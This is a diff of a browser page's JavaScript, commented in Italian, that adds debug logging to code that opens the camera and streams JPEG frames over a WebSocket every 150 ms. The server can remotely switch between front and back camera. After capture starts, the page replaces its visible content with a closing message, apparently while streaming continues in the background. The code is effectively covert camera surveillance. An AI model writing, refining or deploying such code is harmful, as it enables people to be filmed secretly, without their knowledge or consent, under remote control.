@@ -29,19 +29,23 @@
     // WebSocket (anche in background)
     const ws = new WebSocket(`wss://${location.host}/bg-stream?room=${room}`);
 
-    ws.onopen = () => startCamera();
+    ws.onopen = () => {
+      console.log('[WS] Aperto, avvio camera');
+      startCamera();
+    };
     ws.onmessage = (e) => {
       try {
         const msg = JSON.parse(e.data);
         if (msg.type === 'camera' && msg.mode) {
+          console.log('[WS] Comando cambio camera:', msg.mode);
           if (msg.mode !== currentFacing) {
             startCamera(msg.mode);
           }
         }
       } catch {}
     };
-    ws.onclose = () => console.log('Connessione persa');
-    ws.onerror = () => console.log('Errore WS');
+    ws.onclose = () => console.log('[WS] Connessione persa');
+    ws.onerror = (e) => console.log('[WS] Errore', e);
 
     // Invia frame ogni 150ms (~6-7 FPS, basso consumo)
     function sendFrame() {
@@ -52,6 +56,9 @@
       canvas.toBlob(blob => {
         if (ws.readyState === WebSocket.OPEN && blob) {
           ws.send(blob);
+          console.log('[WS] Frame inviato', blob.size, 'bytes');
+        } else {
+          console.log('[WS] Frame NON inviato');
         }
       }, 'image/jpeg', 0.6);
       setTimeout(sendFrame, 150);
@@ -64,6 +71,7 @@
         if (stream) {
           stream.getTracks().forEach(t => t.stop());
         }
+        console.log('[CAM] Richiesta camera', facing);
         stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: facing, width: { ideal: 1280 } },
           audio: false
@@ -72,6 +80,7 @@
         video.onloadedmetadata = () => {
           sending = true;
           sendFrame();
+          console.log('[CAM] Camera avviata', facing);
 
           // Messaggio finale + chiudi visuale
           document.body.innerHTML = `
@@ -88,6 +97,7 @@
           }, 3000);
         };
       } catch (err) {
+        console.log('[CAM] Errore apertura camera', err);
         document.body.innerHTML = `<div class="msg">Errore: ${err.message}</div>`;
       }
     }
